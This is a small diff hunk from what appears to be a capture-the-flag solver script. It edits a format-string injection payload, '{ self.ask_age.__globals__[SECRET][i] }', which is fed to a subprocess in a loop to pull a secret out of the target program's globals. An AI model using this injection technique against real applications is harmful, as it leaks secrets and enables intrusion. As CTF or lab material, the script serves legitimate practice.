@@ -76,7 +76,7 @@ while True:
         stderr=subprocess.STDOUT
     )
 
-    payload = f"{{ self.ask_age.__globals__[SECRET][{i}] }}\n"
+    payload = f"{{ self.ask_age.__globals__[SECRET][{ i }] }}\n"
     inp = b"1\n" + payload.encode()
     out, _ = p.communicate(inp)
 
